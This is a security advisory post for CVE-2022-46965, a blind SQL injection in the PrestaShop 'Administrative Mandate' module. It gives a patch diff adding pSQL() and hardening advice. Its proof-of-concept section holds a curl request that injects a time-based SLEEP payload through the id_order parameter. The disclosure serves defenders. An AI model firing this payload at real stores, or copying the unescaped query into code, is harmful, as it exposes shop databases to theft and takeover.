---
layout: post
title: "[CVE-2022-46965] Improper neutralization of an SQL parameter in Administrative Mandate module for PrestaShop"
categories: modules
author:
- TouchWeb.fr
- 202 ecommerce
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,totadministrativemandate"
severity: "high (8.3)"
---

In the module "Administrative Mandate" (totadministrativemandate), an authenticated user can perform SQL injection in affected versions.

## Summary

* **CVE ID**: [CVE-2022-46965](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-46965)
* **Published at**: 2023-01-28
* **Advisory source**: [202 ecommerce](https://github.com/202ecommerce/security-advisories/security/advisories/GHSA-hg7m-23j3-rf56)
* **Vendor**: PrestaShop
* **Product**: totadministrativemandate
* **Impacted release**: >= 1.2.1, < 1.7.2
* **Product author**: 202 ecommerce
* **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
* **Severity**: high (8.3)

## Description

From version 1.2.1 published on 12 October 2012 to 1.7.2 published on 3 December 2020, a sensitive SQL calls in class `PDFMandate::mandatePDF()` (or `pdftot::MandatePDF()` for older version before 1.5) can be executed with a trivial http call and exploited to forge a bind SQL injection.


## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: low
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: low

**Vector string**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L

## Possible malicious usage

* Obtain admin access
* Remove data on the associated PrestaShop


## Proof of concept


```bash
curl -v --cookie-jar cookie.txt 'https://domain.tld/authentification?submitLogin=1&emailXXXX&password=YYY && \
curl -v --cookie cookie.txt 'https://domain.tld/modules/totadministrativemandate/pdftot.php?id_order=1%27%3BSELECT%20SLEEP%2825%29%23'
```

## Patch from 1.6.2

```diff
--- 1.6.2/totadministrativemandate/pdfmandate15.php
+++ 1.7.2/totadministrativemandate/pdfmandate15.php
@@ -1166,15 +1166,15 @@ class PDFMandate extends FPDF
         $mode = 'D';
         $slip = false;
         $delivery = false;
        $reference = Tools::getValue('id_order');

        if (version_compare(_PS_VERSION_, '1.5', '>')) {
-            $SQL = 'SELECT `id_order` FROM `'._DB_PREFIX_."orders` WHERE `reference` = '".$reference."' ";
+            $SQL = 'SELECT `id_order` FROM `'._DB_PREFIX_."orders` WHERE `reference` = '".pSQL($reference)."' ";
            $id_order = Db::getInstance()->getValue($SQL);
        } else {
            $id_order = Tools::getValue('id_order');
        }
        $order = new Order($id_order);
 
        if (
            !Validate::isLoadedObject($order)

--- 1.6.2/totadministrativemandate/pdfmandate16.php
+++ 1.7.2/totadministrativemandate/pdfmandate16.php
@@ -345,15 +345,15 @@ class PDFMandate extends TCPDF
         $mode = 'D';
         $slip = false;
         $delivery = false;
        $reference = Tools::getValue('id_order');

        if (version_compare(_PS_VERSION_, '1.5', '>')) {
-            $SQL = 'SELECT `id_order` FROM `'._DB_PREFIX_."orders` WHERE `reference` = '".$reference."' ";
+            $SQL = 'SELECT `id_order` FROM `'._DB_PREFIX_."orders` WHERE `reference` = '".pSQL($reference)."' ";
            $id_order = Db::getInstance()->getValue($SQL);
        } else {
            $id_order = Tools::getValue('id_order');
        }
        $order = new Order($id_order);
 
        if (
            !Validate::isLoadedObject($order)
```

202 ecommerce thanks TouchWeb for its courtesy and its help after the vulnerability disclosure.

## Other recommandations

* It’s recommended to upgrade the module up to 1.7.2.
* Upgrade PrestaShop beyond 1.7.8.8 (and 8.0.1) to disable multiquery executions (separated by ";").
* Change the default database prefix `ps_` by a new longer arbitrary prefix. Nethertheless, be warned that this is useless against blackhat with DBA senior skill because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against these set of rules.

## Links

* [202 ecommerce security advisory post](https://github.com/202ecommerce/security-advisories/security/advisories/GHSA-hg7m-23j3-rf56)
* [PrestaShop addons product page](https://addons.prestashop.com/en/bank-transfer-payment/6297-administrative-mandate.html)
* [National Vulnerability Database](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-46965)
